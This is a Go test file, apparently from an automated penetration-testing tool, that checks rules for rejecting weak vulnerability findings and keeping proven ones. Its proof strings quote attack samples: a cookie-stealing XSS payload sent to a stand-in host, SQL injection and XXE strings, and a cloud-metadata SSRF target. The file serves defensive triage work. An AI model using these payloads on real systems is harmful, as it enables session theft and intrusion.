package reporting

import (
	"strings"
	"sync"
	"testing"
)

func TestCheckFalsePositive_MissingHeaders(t *testing.T) {
	tests := []struct {
		title      string
		desc       string
		severity   string
		proof      string
		wantReject bool
	}{
		{"Missing X-Frame-Options Header", "The X-Frame-Options header is not set", "medium", "", true},
		{"Missing Content-Security-Policy", "CSP is not configured", "high", "", true},
		{"Missing HSTS Header", "Strict-Transport-Security not found", "critical", "", true},
		// Low/info severity should NOT be rejected for headers
		{"Missing X-Frame-Options Header", "Header not set", "info", "", false},
		{"Missing X-Frame-Options Header", "Header not set", "low", "", false},
	}

	for _, tt := range tests {
		result := checkFalsePositive(tt.title, tt.desc, tt.severity, tt.proof)
		gotReject := result != ""
		if gotReject != tt.wantReject {
			t.Errorf("title=%q severity=%q: wantReject=%v gotReject=%v (msg=%s)", tt.title, tt.severity, tt.wantReject, gotReject, result)
		}
	}
}

func TestCheckFalsePositive_VersionDisclosure(t *testing.T) {
	tests := []struct {
		title      string
		severity   string
		wantReject bool
	}{
		{"Server Version Disclosure - Apache 2.4.41", "medium", true},
		{"X-Powered-By Header Reveals Technology", "high", true},
		{"Technology Disclosure via banner", "critical", true},
		{"Server Version Disclosure", "info", false},
	}

	for _, tt := range tests {
		result := checkFalsePositive(tt.title, tt.title, tt.severity, "")
		gotReject := result != ""
		if gotReject != tt.wantReject {
			t.Errorf("title=%q severity=%q: wantReject=%v gotReject=%v", tt.title, tt.severity, tt.wantReject, gotReject)
		}
	}
}

func TestCheckFalsePositive_SSL(t *testing.T) {
	tests := []struct {
		title      string
		wantReject bool
	}{
		{"Weak SSL Cipher Suite", true},
		{"TLS 1.0 Enabled", true},
		{"Expired Certificate", true},
		{"POODLE Vulnerability", true},
	}

	for _, tt := range tests {
		result := checkFalsePositive(tt.title, "", "medium", "")
		gotReject := result != ""
		if gotReject != tt.wantReject {
			t.Errorf("title=%q: wantReject=%v gotReject=%v", tt.title, tt.wantReject, gotReject)
		}
	}
}

func TestCheckFalsePositive_DNS(t *testing.T) {
	tests := []struct {
		title      string
		wantReject bool
	}{
		{"Missing SPF Record", true},
		{"No DMARC Policy", true},
		{"DKIM Not Configured", true},
		{"Email Spoofing Possible via missing SPF", true},
	}

	for _, tt := range tests {
		result := checkFalsePositive(tt.title, "", "high", "")
		gotReject := result != ""
		if gotReject != tt.wantReject {
			t.Errorf("title=%q: wantReject=%v gotReject=%v (msg=%s)", tt.title, tt.wantReject, gotReject, result)
		}
	}
}

func TestCheckFalsePositive_CORSWithoutProof(t *testing.T) {
	// CORS without cookie/token theft proof → rejected at medium+
	result := checkFalsePositive("CORS Misconfiguration", "Access-Control-Allow-Origin reflects input", "high", "curl showed reflected origin")
	if result == "" {
		t.Error("CORS without exploit proof should be rejected at high severity")
	}

	// CORS WITH theft proof → accepted
	result = checkFalsePositive("CORS Misconfiguration", "Allows credential theft", "high", "JavaScript fetch() exfiltrates session cookie via CORS")
	if result != "" {
		t.Errorf("CORS with exploit proof should NOT be rejected, got: %s", result)
	}
}

func TestCheckFalsePositive_OpenRedirectWithoutChain(t *testing.T) {
	// Open redirect alone → rejected at medium+
	result := checkFalsePositive("Open Redirect", "Redirects to attacker URL", "medium", "curl -L shows redirect to evil.com")
	if result == "" {
		t.Error("open redirect without chain should be rejected at medium+")
	}

	// Open redirect chained with OAuth → accepted
	result = checkFalsePositive("Open Redirect to OAuth Token Theft", "Redirect steals OAuth token", "high", "OAuth code redirected via open redirect, token stolen via phishing")
	if result != "" {
		t.Errorf("open redirect with OAuth chain should NOT be rejected, got: %s", result)
	}
}

func TestCheckFalsePositive_XSSReflectionOnly(t *testing.T) {
	tests := []struct {
		name       string
		title      string
		desc       string
		severity   string
		proof      string
		wantReject bool
	}{
		// Reflection-only proof (payload echoed, no execution) → rejected at medium+.
		{
			"reflected payload only",
			"Reflected XSS in search parameter",
			"The q parameter is reflected in the response",
			"medium",
			"curl shows the payload reflected: <script>alert(1)</script> appears in the HTML body",
			true,
		},
		{
			"img onerror reflection only",
			"Reflected XSS",
			"Payload reflected in page",
			"high",
			"Response contained <img src=x onerror=alert(1)> in the body",
			true,
		},
		// Encoded reflection → output encoding works → rejected.
		{
			"encoded reflection",
			"Reflected XSS in name field",
			"name field reflects input",
			"medium",
			"The response shows &lt;script&gt;alert(1)&lt;/script&gt; in the page",
			true,
		},
		// Real execution proof → NOT rejected.
		{
			"execution via document.domain",
			"Reflected XSS in search",
			"q parameter executes",
			"medium",
			"browser_action execute_js confirmed alert(document.domain) fired showing the target origin in a dialog",
			false,
		},
		// Stored XSS with out-of-band callback → NOT rejected.
		{
			"stored xss with callback",
			"Stored XSS in support ticket",
			"Ticket description stored unsanitized",
			"high",
			"XSS Hunter callback received with admin session cookie when agent viewed the ticket; payload <script src=...></script> fired in admin panel",
			false,
		},
		// document.cookie execution proof → NOT rejected.
		{
			"document.cookie exfil proof",
			"Stored XSS in profile",
			"profile bio stored unsanitized",
			"high",
			"Payload <script>new Image().src='//x/?c='+document.cookie</script> fired and exfiltrated the session cookie",
			false,
		},
		// Low/info severity → gate does not apply.
		{
			"reflection only but info severity",
			"Reflected input in search",
			"q parameter reflected",
			"info",
			"payload <script>alert(1)</script> reflected",
			false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := checkFalsePositive(tt.title, tt.desc, tt.severity, tt.proof)
			gotReject := result != ""
			if gotReject != tt.wantReject {
				t.Errorf("title=%q severity=%q: wantReject=%v gotReject=%v (msg=%s)",
					tt.title, tt.severity, tt.wantReject, gotReject, result)
			}
		})
	}
}

func TestCheckFalsePositive_S3CloudFrontTakeover(t *testing.T) {
	tests := []struct {
		name       string
		title      string
		desc       string
		severity   string
		proof      string
		wantReject bool
	}{
		// The reported false positive: CloudFront origin returns NoSuchKey (bucket exists).
		{
			"cloudfront NoSuchKey is not takeover",
			"S3 Bucket Subdomain Takeover via CloudFront Distribution",
			"mta-sts subdomain CNAMEs to a CloudFront distribution with a dangling S3 origin",
			"critical",
			"dig CNAME shows d1uhex0.cloudfront.net; curl of the distribution returns <Code>NoSuchKey</Code> for key email.example.com/",
			true,
		},
		// CloudFront-fronted, only global-namespace NoSuchBucket, no claim → rejected.
		{
			"cloudfront NoSuchBucket without claim proof",
			"Subdomain Takeover via dangling CloudFront S3 origin",
			"CNAME to cloudfront.net, bucket does not exist",
			"high",
			"curl https://bucket.s3.amazonaws.com returns <Code>NoSuchBucket</Code>; the CloudFront origin is dangling",
			true,
		},
		// Genuine, claimed S3 takeover with canary → accepted.
		{
			"claimed s3 takeover with canary",
			"Subdomain Takeover of assets.example.com via dangling S3 website endpoint",
			"CNAME points directly to bucket.s3-website-us-east-1.amazonaws.com returning NoSuchBucket",
			"high",
			"Created the bucket and uploaded a benign canary; my content is now served over https://assets.example.com confirming takeover",
			false,
		},
		// Non-S3 takeover (GitHub Pages) is not touched by this gate.
		{
			"github pages takeover untouched",
			"Subdomain Takeover via GitHub Pages",
			"docs.example.com CNAMEs to org.github.io which is unclaimed",
			"high",
			"Response: There isn't a GitHub Pages site here. Claimed the repo and served a canary at docs.example.com",
			false,
		},
		// Info severity → gate does not apply.
		{
			"cloudfront nosuchkey but info severity",
			"Possible subdomain takeover via CloudFront",
			"mta-sts subdomain, NoSuchKey from distribution",
			"info",
			"NoSuchKey returned",
			false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := checkFalsePositive(tt.title, tt.desc, tt.severity, tt.proof)
			gotReject := result != ""
			if gotReject != tt.wantReject {
				t.Errorf("title=%q severity=%q: wantReject=%v gotReject=%v (msg=%s)",
					tt.title, tt.severity, tt.wantReject, gotReject, result)
			}
		})
	}
}

func TestCheckFalsePositive_TimeBasedSQLi(t *testing.T) {
	tests := []struct {
		name       string
		title      string
		desc       string
		severity   string
		proof      string
		wantReject bool
	}{
		// Single SLEEP measurement, no baseline → rejected.
		{
			"single sleep measurement",
			"Time-based blind SQL injection in id parameter",
			"The id parameter is injectable",
			"high",
			"Sent ' AND SLEEP(5)-- and the response took 5.2 seconds, confirming time-based blind SQLi.",
			true,
		},
		// Single SLEEP(10) — a lone high sleep value is still single-shot → rejected.
		{
			"single sleep10 measurement",
			"Time-based blind SQL injection",
			"id parameter injectable",
			"high",
			"Sent ' AND SLEEP(10)-- and the response took 10 seconds.",
			true,
		},
		// Differential timing with baseline → accepted.
		{
			"differential timing accepted",
			"Time-based blind SQL injection",
			"id parameter injectable",
			"high",
			"baseline 0.2s; SLEEP(0) 0.3s; SLEEP(5) 5.3s; SLEEP(10) 10.4s; repeated 3x, delay scales with sleep value",
			false,
		},
		// Hard confirmation (data extraction) → accepted even with timing words.
		{
			"data extraction accepted",
			"SQL injection in login",
			"union-based SQLi",
			"high",
			"sqlmap dumped users table via UNION SELECT from information_schema; response time noted",
			false,
		},
		// Error-based confirmation → accepted.
		{
			"error based accepted",
			"SQL injection in search",
			"error-based SQLi",
			"high",
			"Injecting a single quote returned: You have an error in your SQL syntax near '''",
			false,
		},
		// Info severity → gate does not apply.
		{
			"single sleep but info",
			"Possible time-based SQLi",
			"id parameter",
			"info",
			"' AND SLEEP(5)-- took 5 seconds",
			false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := checkFalsePositive(tt.title, tt.desc, tt.severity, tt.proof)
			gotReject := result != ""
			if gotReject != tt.wantReject {
				t.Errorf("title=%q severity=%q: wantReject=%v gotReject=%v (msg=%s)",
					tt.title, tt.severity, tt.wantReject, gotReject, result)
			}
		})
	}
}

func TestCheckFalsePositive_SSLScoping(t *testing.T) {
	// Config noise → still rejected.
	rejects := []string{
		"Weak SSL Cipher Suite",
		"TLS 1.0 Enabled",
		"Expired Certificate",
		"POODLE Vulnerability",
		"Self-signed certificate in use",
	}
	for _, title := range rejects {
		if checkFalsePositive(title, "", "medium", "") == "" {
			t.Errorf("title=%q: expected SSL/TLS config noise to be rejected", title)
		}
	}

	// Genuine TLS exploit mentioning "TLS"/"certificate" → NOT auto-rejected by this gate.
	keep := []struct{ title, desc, proof string }{
		{"Certificate validation bypass enables MITM", "App accepts any TLS certificate, allowing interception", "Presented a self-issued cert; app connected and leaked the bearer token"},
		{"mTLS client authentication bypass", "Mutual TLS auth can be bypassed by omitting the client cert", "Reached the protected admin API without a client certificate"},
	}
	for _, k := range keep {
		if r := checkFalsePositive(k.title, k.desc, "high", k.proof); r != "" {
			t.Errorf("title=%q: genuine TLS exploit should NOT be rejected by SSL gate, got: %s", k.title, r)
		}
	}
}

func TestCheckFalsePositive_CORSAliases(t *testing.T) {
	// Alternate phrasing without the literal "cors" should still be gated.
	result := checkFalsePositive(
		"Access-Control-Allow-Origin reflects arbitrary origin",
		"ACAO header reflects any Origin with credentials enabled",
		"high",
		"curl with Origin: https://evil.com is reflected in Access-Control-Allow-Origin",
	)
	if result == "" {
		t.Error("CORS finding phrased via ACAO (no 'cors' literal) should still be rejected without theft proof")
	}

	// With credential-theft proof → accepted.
	result = checkFalsePositive(
		"Access-Control-Allow-Origin misconfiguration",
		"ACAO reflects origin with credentials",
		"high",
		"PoC fetch() with credentials exfiltrates the session cookie cross-origin to attacker.com",
	)
	if result != "" {
		t.Errorf("ACAO with credential-theft PoC should NOT be rejected, got: %s", result)
	}
}

func TestCheckFalsePositive_MethodEnforcementBypass(t *testing.T) {
	tests := []struct {
		name       string
		title      string
		desc       string
		severity   string
		proof      string
		wantReject bool
	}{
		// The reported false positive: status-codes-only "method bypass".
		{
			"status-codes-only method bypass",
			"Broken Access Control on /auth Endpoint - Method Enforcement Bypass",
			"The /auth endpoint only enforces auth for GET; POST, PUT, PATCH, DELETE, OPTIONS, HEAD return 200 without credentials.",
			"high",
			"GET /auth: 401 (blocked); POST /auth: 200 (VULNERABLE); PUT 200; PATCH 200; DELETE 200; OPTIONS 200; HEAD 200",
			true,
		},
		// Same but with proven state change → accepted.
		{
			"method bypass with state change",
			"Broken Access Control - unauthenticated DELETE",
			"DELETE on /api/users/123 works without auth",
			"high",
			"Unauthenticated DELETE /api/users/123 returned 200 and the user record was deleted; re-fetch returns 404",
			false,
		},
		// Method-based finding where data was returned → accepted.
		{
			"method bypass returning data",
			"Access control bypass via POST method",
			"POST returns data that GET blocks",
			"high",
			"POST /account returned another user's PII in the JSON body: email victim@example.com, balance $4,200",
			false,
		},
		// Info severity → gate does not apply.
		{
			"method bypass info severity",
			"Method enforcement inconsistency on /auth",
			"non-GET methods return 200",
			"info",
			"POST 200, PUT 200, empty body",
			false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := checkFalsePositive(tt.title, tt.desc, tt.severity, tt.proof)
			gotReject := result != ""
			if gotReject != tt.wantReject {
				t.Errorf("title=%q severity=%q: wantReject=%v gotReject=%v (msg=%s)",
					tt.title, tt.severity, tt.wantReject, gotReject, result)
			}
		})
	}
}

func TestCheckFalsePositive_ClientSideSSRF(t *testing.T) {
	tests := []struct {
		name       string
		title      string
		desc       string
		severity   string
		proof      string
		wantReject bool
	}{
		// The reported false positive: client-side URL-param handling labeled SSRF.
		{
			"client-side mislabeled as ssrf",
			"Server-Side Request Forgery (SSRF) via graphqlUrl Parameter - Token Theft",
			"The embeddable dashboard processes URL parameters client-side in dashboards.bundle.js and uses graphqlUrl to configure requests from the browser.",
			"critical",
			"From bundle.js: window.location.search is parsed; the browser sends a Bearer token to the attacker-supplied graphqlUrl. Attacker captures the token they put in the URL.",
			true,
		},
		// Genuine SSRF with out-of-band callback → accepted.
		{
			"real ssrf with callback",
			"SSRF in webhook URL parameter",
			"The server fetches a user-supplied URL",
			"high",
			"Set param to http://interact.sh subdomain; callback received at the collaborator server from the target's IP, confirming server-side request.",
			false,
		},
		// Genuine SSRF reaching cloud metadata → accepted.
		{
			"real ssrf metadata",
			"SSRF to cloud metadata",
			"server-side fetch of attacker URL",
			"high",
			"Param set to http://169.254.169.254/latest/meta-data/ returned the IAM role credentials in the response body",
			false,
		},
		// Info severity → gate does not apply.
		{
			"client-side ssrf info",
			"Possible SSRF via url parameter",
			"browser reads url param",
			"info",
			"client-side fetch from window.location",
			false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := checkFalsePositive(tt.title, tt.desc, tt.severity, tt.proof)
			gotReject := result != ""
			if gotReject != tt.wantReject {
				t.Errorf("title=%q severity=%q: wantReject=%v gotReject=%v (msg=%s)",
					tt.title, tt.severity, tt.wantReject, gotReject, result)
			}
		})
	}
}

func TestReportVuln_IndependentVerifierGate(t *testing.T) {
	base := func() map[string]string {
		m := validReportArgs()
		return m
	}

	t.Run("confirmed persists and marks verified", func(t *testing.T) {
		ctx := "verifier-confirm"
		CleanupContext(ctx)
		defer CleanupContext(ctx)
		SetFindingVerifier(ctx, func(VerificationRequest) VerificationVerdict {
			return VerificationVerdict{Confirmed: true, Reason: "reproduced", Evidence: "dumped rows again"}
		})

		res, err := reportVulnWithContextID(ctx, base())
		if err != nil {
			t.Fatalf("report error: %v", err)
		}
		if _, ok := res.Metadata["vuln_id"]; !ok {
			t.Fatalf("expected vuln stored, got: %s", res.Output)
		}
		vulns := GetVulnerabilitiesForContext(ctx)
		if len(vulns) != 1 || !vulns[0].Verified {
			t.Fatalf("expected 1 verified vuln, got %d (verified=%v)", len(vulns), len(vulns) == 1 && vulns[0].Verified)
		}
	})

	t.Run("rejected drops the finding", func(t *testing.T) {
		ctx := "verifier-reject"
		CleanupContext(ctx)
		defer CleanupContext(ctx)
		SetFindingVerifier(ctx, func(VerificationRequest) VerificationVerdict {
			return VerificationVerdict{Confirmed: false, Reason: "could not reproduce — by design"}
		})

		res, err := reportVulnWithContextID(ctx, base())
		if err != nil {
			t.Fatalf("report error: %v", err)
		}
		if !strings.Contains(res.Output, "REJECTED by independent verifier") {
			t.Fatalf("expected verifier rejection, got: %s", res.Output)
		}
		if got := len(GetVulnerabilitiesForContext(ctx)); got != 0 {
			t.Fatalf("expected 0 vulns after verifier rejection, got %d", got)
		}
	})

	t.Run("inconclusive persists as unverified", func(t *testing.T) {
		ctx := "verifier-inconclusive"
		CleanupContext(ctx)
		defer CleanupContext(ctx)
		SetFindingVerifier(ctx, func(VerificationRequest) VerificationVerdict {
			return VerificationVerdict{Inconclusive: true, Reason: "verifier LLM error"}
		})

		res, err := reportVulnWithContextID(ctx, base())
		if err != nil {
			t.Fatalf("report error: %v", err)
		}
		vulns := GetVulnerabilitiesForContext(ctx)
		if len(vulns) != 1 {
			t.Fatalf("expected 1 vuln stored on inconclusive, got %d (%s)", len(vulns), res.Output)
		}
		if vulns[0].Verified {
			t.Fatalf("inconclusive finding must NOT be marked Verified")
		}
		if !strings.Contains(res.Output, "INCONCLUSIVE") {
			t.Fatalf("expected inconclusive notice, got: %s", res.Output)
		}
	})

	t.Run("no verifier falls back to heuristic verified flag", func(t *testing.T) {
		ctx := "verifier-absent"
		CleanupContext(ctx) // ensure no verifier registered for this context
		defer CleanupContext(ctx)

		res, err := reportVulnWithContextID(ctx, base())
		if err != nil {
			t.Fatalf("report error: %v", err)
		}
		vulns := GetVulnerabilitiesForContext(ctx)
		if len(vulns) != 1 || !vulns[0].Verified {
			t.Fatalf("expected 1 vuln verified by heuristic fallback, got %d (%s)", len(vulns), res.Output)
		}
	})
}

func TestCheckClaimConsistency(t *testing.T) {
	tests := []struct {
		name       string
		title      string
		cwe        string
		method     string
		vector     string
		severity   string
		proof      string
		wantReject bool
	}{
		// SSRF + 'reflected' method with NO hard evidence → reject (check #1).
		{
			"ssrf reflected no evidence",
			"SSRF via parameter", "CWE-918", "reflected", "",
			"high", "the parameter value appears in the response", true,
		},
		// SSRF with OOB callback → accepted (callback_received, not reflected).
		{
			"ssrf with callback",
			"SSRF in webhook", "CWE-918", "callback_received", "",
			"high", "interact.sh callback received from the target server", false,
		},
		// SSRF labeled reflected BUT proof shows internal access → not dropped (real finding).
		{
			"ssrf reflected but internal hit",
			"SSRF in url param", "CWE-918", "reflected", "",
			"high", "the server connected to internal host 10.0.0.5 and returned the admin panel", false,
		},
		// 'reflected' method for a hard class (CWE-89) → reject.
		{
			"reflected method for sqli",
			"SQL Injection", "CWE-89", "reflected", "",
			"high", "the input is reflected in the response", true,
		},
		// CVSS I:H without state change → reject.
		{
			"integrity high no state change",
			"Broken access control", "CWE-284", "manual_verified",
			"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
			"high", "POST returned 200 with empty body", true,
		},
		// CVSS C:H without data obtained → reject.
		{
			"confidentiality high no data",
			"Information exposure", "CWE-200", "manual_verified",
			"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
			"high", "the endpoint returned a 200 response", true,
		},
		// CVSS C:H WITH extracted data → accepted.
		{
			"confidentiality high with data",
			"SQL injection", "CWE-89", "data_extracted",
			"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
			"high", "dumped users table via union select from information_schema", false,
		},
		// Info severity → gate does not apply.
		{
			"info severity skipped",
			"SSRF maybe", "CWE-918", "reflected", "",
			"info", "browser fetch", false,
		},
		// SQLi "proven" only via RCE evidence, no native SQLi proof → reject (provenance).
		{
			"sqli proven by rce only",
			"SQL Injection in /search", "CWE-89", "exploited", "",
			"high", "dumped the database using the eval() RCE; rows: admin1:pass1, admin2:pass2", true,
		},
		// SQLi proven natively (sqlmap/union) → accept.
		{
			"sqli proven natively",
			"SQL Injection in /search", "CWE-89", "data_extracted", "",
			"high", "sqlmap confirmed union select from information_schema, dumped users table", false,
		},
		// Real SQLi-to-RCE chain (native proof present) → accept.
		{
			"sqli to rce chain",
			"SQL Injection escalated to RCE", "CWE-89", "data_extracted", "",
			"high", "confirmed boolean-based SQLi via ' OR 1=1, then used INTO OUTFILE to gain RCE", false,
		},
		// Blind XXE confirmed only by a success message → reject (blind validation).
		{
			"blind xxe success only",
			"XXE Injection in /search", "CWE-611", "exploited", "",
			"high", "submitted XML with an external entity; response was 'Search made successfully'", true,
		},
		// Blind XXE with OOB callback → accept.
		{
			"blind xxe with oob",
			"XXE Injection in /search", "CWE-611", "callback_received", "",
			"high", "interact.sh callback received confirming the parser resolved my external entity out-of-band", false,
		},
		// In-band XXE returning file content → accept.
		{
			"in-band xxe file read",
			"XXE Injection in /upload", "CWE-611", "exploited", "",
			"high", "the response echoed back root:x:0:0:root:/root:/bin/bash from /etc/passwd", false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := checkClaimConsistency(tt.title, tt.cwe, tt.method, tt.vector, tt.severity, "", tt.proof)
			gotReject := got != ""
			if gotReject != tt.wantReject {
				t.Errorf("wantReject=%v gotReject=%v (msg=%s)", tt.wantReject, gotReject, got)
			}
		})
	}
}

func TestCheckFalsePositive_OpenAPISpecExposure(t *testing.T) {
	tests := []struct {
		name       string
		title      string
		desc       string
		severity   string
		proof      string
		wantReject bool
	}{
		// The reported false positive: public OpenAPI spec + field names.
		{
			"openapi spec field names",
			"Unauthenticated Access to OpenAPI Specification Exposes Complete API Documentation",
			"The OpenAPI spec at /v1/openapi.json is accessible without auth, exposing 80 endpoints and field names like webhook_secret, api_key, stripe_api_key.",
			"medium",
			"curl /v1/openapi.json returns 200, 1.7MB; field names webhook_secret, api_key found; endpoints enumerated",
			true,
		},
		// Swagger UI exposure, no secret values → rejected.
		{
			"swagger ui exposed",
			"Swagger UI exposed without authentication",
			"swagger api documentation reachable",
			"high",
			"GET /swagger returns the full API spec with all endpoints documented",
			true,
		},
		// OpenAPI spec that actually embeds a live secret value → accepted.
		{
			"openapi with embedded secret value",
			"OpenAPI spec leaks live Stripe key",
			"The openapi.json contains a hardcoded secret",
			"high",
			"The spec's example contains a live key: sk_live_51Hxample... which authenticates to Stripe",
			false,
		},
		// Info severity → gate does not apply.
		{
			"openapi info severity",
			"OpenAPI spec accessible",
			"spec at /openapi.json",
			"info",
			"200 OK",
			false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := checkFalsePositive(tt.title, tt.desc, tt.severity, tt.proof)
			gotReject := result != ""
			if gotReject != tt.wantReject {
				t.Errorf("title=%q severity=%q: wantReject=%v gotReject=%v (msg=%s)",
					tt.title, tt.severity, tt.wantReject, gotReject, result)
			}
		})
	}
}

func TestCheckFalsePositive_CSVInjection(t *testing.T) {
	result := checkFalsePositive("CSV Injection in Export", "Formula injection in CSV export", "medium", "")
	if result == "" {
		t.Error("CSV injection at medium should be rejected")
	}

	result = checkFalsePositive("CSV Injection in Export", "Formula injection", "low", "")
	if result != "" {
		t.Errorf("CSV injection at low should NOT be rejected, got: %s", result)
	}
}

func TestCheckFalsePositive_Clickjacking(t *testing.T) {
	result := checkFalsePositive("Clickjacking on Login Page", "Page can be iframed", "high", "")
	if result == "" {
		t.Error("clickjacking at high should be rejected")
	}

	result = checkFalsePositive("Clickjacking on Login Page", "Page can be iframed", "low", "")
	if result != "" {
		t.Errorf("clickjacking at low should NOT be rejected, got: %s", result)
	}
}

func TestCheckFalsePositive_DirectoryListing(t *testing.T) {
	// Directory listing without sensitive files → rejected
	result := checkFalsePositive("Directory Listing Enabled", "Apache autoindex enabled", "medium", "Shows index of /images/")
	if result == "" {
		t.Error("directory listing without sensitive files should be rejected at medium+")
	}

	// Directory listing WITH sensitive files → accepted
	result = checkFalsePositive("Directory Listing Enabled", "Directory listing exposes backup files", "high", "Found database.sql backup with password hashes")
	if result != "" {
		t.Errorf("directory listing with sensitive files should NOT be rejected, got: %s", result)
	}
}

func TestCheckFalsePositive_TraceMethod(t *testing.T) {
	result := checkFalsePositive("TRACE Method Enabled", "HTTP TRACE method is enabled", "medium", "")
	if result == "" {
		t.Error("TRACE method should be rejected")
	}

	result = checkFalsePositive("OPTIONS Method Enabled", "HTTP OPTIONS reveals methods", "low", "")
	if result == "" {
		t.Error("OPTIONS method should be rejected")
	}
}

func TestCheckFalsePositive_ScannerOnly(t *testing.T) {
	result := checkFalsePositive("Nuclei Detected SQL Injection", "nuclei found potential SQLi", "high", "")
	if result == "" {
		t.Error("scanner-only finding without proof should be rejected")
	}

	result = checkFalsePositive("Nuclei Detected SQL Injection", "nuclei found SQLi, manually verified", "high", "sqlmap confirmed with --dump")
	if result != "" {
		t.Errorf("scanner finding with manual proof should NOT be rejected, got: %s", result)
	}
}

func TestPipeline_RealFindingsSurvive(t *testing.T) {
	// Well-formed REAL findings must pass BOTH deterministic gates untouched.
	// This is the guard against the new gates suppressing true findings.
	real := []struct {
		name     string
		title    string
		desc     string
		cwe      string
		method   string
		vector   string
		severity string
		proof    string
	}{
		{
			"sqli data extraction",
			"SQL Injection in /login", "Union-based SQLi in the id parameter", "CWE-89", "data_extracted",
			"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", "high",
			"sqlmap dumped the users table via UNION SELECT from information_schema; extracted 512 rows including password hashes",
		},
		{
			"reflected xss executed",
			"Reflected XSS in search", "q parameter reflected unencoded", "CWE-79", "exploited",
			"CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N", "medium",
			"browser_action execute_js confirmed alert(document.domain) fired showing the target origin; screenshot attached",
		},
		{
			"ssrf internal metadata",
			"SSRF via image url", "Server fetches attacker-controlled URL", "CWE-918", "callback_received",
			"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", "critical",
			"interact.sh callback received from the target; fetched 169.254.169.254/latest/meta-data returning IAM role credentials",
		},
		{
			"idor two accounts",
			"IDOR in order API", "Can read other users' orders", "CWE-639", "authenticated",
			"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N", "high",
			"As user B, retrieved user A's order record including PII: another user's email and shipping address",
		},
		{
			"rce command output",
			"RCE via file upload", "Uploaded a web shell", "CWE-78", "exploited",
			"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", "critical",
			"executed id via the shell; command execution confirmed: uid=33(www-data) gid=33(www-data)",
		},
		{
			"blind stored xss callback",
			"Stored XSS in support ticket", "Fires in admin panel", "CWE-79", "callback_received",
			"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N", "high",
			"XSS Hunter callback received with the admin session cookie when an agent viewed the ticket",
		},
		{
			"internal ssrf reflected-mislabel",
			"SSRF in webhook url", "Server connects to attacker URL", "CWE-918", "reflected",
			"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", "high",
			"the server connected to internal host 10.0.0.5 and the internal admin dashboard HTML was returned",
		},
	}

	for _, tt := range real {
		t.Run(tt.name, func(t *testing.T) {
			if r := checkFalsePositive(tt.title, tt.desc, tt.severity, tt.proof); r != "" {
				t.Errorf("checkFalsePositive rejected a REAL finding %q: %s", tt.title, r)
			}
			if r := checkClaimConsistency(tt.title, tt.cwe, tt.method, tt.vector, tt.severity, tt.desc, tt.proof); r != "" {
				t.Errorf("checkClaimConsistency rejected a REAL finding %q: %s", tt.title, r)
			}
		})
	}
}

func TestCheckFalsePositive_RealVulns(t *testing.T) {
	// Real vulnerabilities should NOT be rejected
	realVulns := []struct {
		title    string
		desc     string
		severity string
		proof    string
	}{
		{"SQL Injection in login endpoint", "Union-based SQLi", "critical", "sqlmap extracted admin table"},
		{"Stored XSS in comment field", "Script tag stored", "high", "alert(1) reflected in response body"},
		{"SSRF via image URL parameter", "Internal metadata accessed", "critical", "169.254.169.254 metadata returned"},
		{"IDOR in user profile API", "Can access other users", "high", "Changed user_id=1 to user_id=2, got admin data"},
		{"Remote Code Execution via file upload", "PHP shell uploaded", "critical", "whoami returned www-data"},
	}

	for _, tt := range realVulns {
		result := checkFalsePositive(tt.title, tt.desc, tt.severity, tt.proof)
		if result != "" {
			t.Errorf("real vuln %q should NOT be rejected, got: %s", tt.title, result)
		}
	}
}

func TestReportVulnChecksDuplicateBeforeAppending(t *testing.T) {
	contextID := "test-report-duplicate"
	CleanupContext(contextID)
	defer CleanupContext(contextID)

	args := validReportArgs()
	first, err := reportVulnWithContextID(contextID, args)
	if err != nil {
		t.Fatalf("first report error = %v", err)
	}
	if _, ok := first.Metadata["vuln_id"].(string); !ok {
		t.Fatalf("first report metadata = %#v, want vuln_id", first.Metadata)
	}

	duplicateArgs := validReportArgs()
	duplicateArgs["endpoint"] = "https://example.com/login?id=2"
	second, err := reportVulnWithContextID(contextID, duplicateArgs)
	if err != nil {
		t.Fatalf("second report error = %v", err)
	}
	if !strings.Contains(second.Output, "DUPLICATE") {
		t.Fatalf("second report output = %q, want duplicate", second.Output)
	}
	if got, ok := second.Metadata["duplicate"].(bool); !ok || !got {
		t.Fatalf("second report metadata = %#v, want duplicate=true", second.Metadata)
	}
	if got := len(GetVulnerabilitiesForContext(contextID)); got != 1 {
		t.Fatalf("stored vulnerabilities = %d, want 1", got)
	}
}

func TestReportVulnSameFindingAllowedAcrossScanContexts(t *testing.T) {
	contextA := "test-report-context-a"
	contextB := "test-report-context-b"
	CleanupContext(contextA)
	CleanupContext(contextB)
	defer CleanupContext(contextA)
	defer CleanupContext(contextB)

	first, err := reportVulnWithContextID(contextA, validReportArgs())
	if err != nil {
		t.Fatalf("first report error = %v", err)
	}
	if _, ok := first.Metadata["vuln_id"].(string); !ok {
		t.Fatalf("first report metadata = %#v, want vuln_id", first.Metadata)
	}

	second, err := reportVulnWithContextID(contextB, validReportArgs())
	if err != nil {
		t.Fatalf("second report error = %v", err)
	}
	if _, ok := second.Metadata["vuln_id"].(string); !ok {
		t.Fatalf("second report metadata = %#v, want vuln_id", second.Metadata)
	}
	if got, _ := second.Metadata["duplicate"].(bool); got {
